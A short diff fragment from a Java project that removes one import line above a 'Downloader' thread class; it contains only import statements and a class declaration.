@@ -9,7 +9,6 @@ import java.net.URLConnection;
 import java.util.Random;
 
 import com.redpois0n.common.OperatingSystem;
-import com.redpois0n.stub.packets.outgoing.Header;
 import com.redpois0n.utils.Utils;
 
 public class Downloader extends Thread {
